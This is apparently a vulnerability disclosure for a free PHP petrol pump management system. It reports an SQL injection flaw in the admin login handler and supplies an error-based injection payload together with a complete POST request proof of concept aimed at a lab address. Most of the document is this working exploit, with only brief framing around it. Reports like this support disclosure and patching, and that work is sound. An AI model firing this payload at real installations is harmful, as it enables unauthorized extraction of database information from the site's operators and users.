# SQLi-4

# Vulnerability Description

The Petrol pump management System in PHP Free Source Code (It is an open source project from [https://codeastro.com/](https://codeastro.com/)) has SQL injection vulnerabilities, which can lead to database information leakage.

1. BUG_Author: hjhctzz
2. vendors: [https://codeastro.com/membership-management-system-in-php-with-source-code/](https://www.sourcecodester.com/php/17180/petrol-pump-management-software-free-download.html);
3. The program is built using the PHP 7.3.4nts version;
4. Vulnerability location: /admin/app/login_crud.php

[+] Payload:

```http
'and/**/extractvalue(1,concat(char(126),user()))and'
```

POC：

```http
POST http://192.168.10.108/fuelflow/admin/app/login_crud.php HTTP/1.1
Host: 192.168.10.108
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 110
Origin: http://192.168.10.108
Connection: close
Referer: http://192.168.10.108/fuelflow/index.php
Cookie: PHPSESSID=p5a1pv4juicgdu3qcpo85v2h4t
Upgrade-Insecure-Requests: 1

email=mayuri.infospace%40gmail.com'and/**/extractvalue(1,concat(char(126),user()))and'&password=admin1&submit=
```

## How to verify

Build the vulnerability environment according to the steps provided by the source code author and execute the poc provided above：

​![image-20240227223654-j5aegt4](https://github.com/ycxdzj/CVE_Hunter/assets/159221768/0e68ddf2-2eac-47e0-bd4a-2cea9fc46b55)

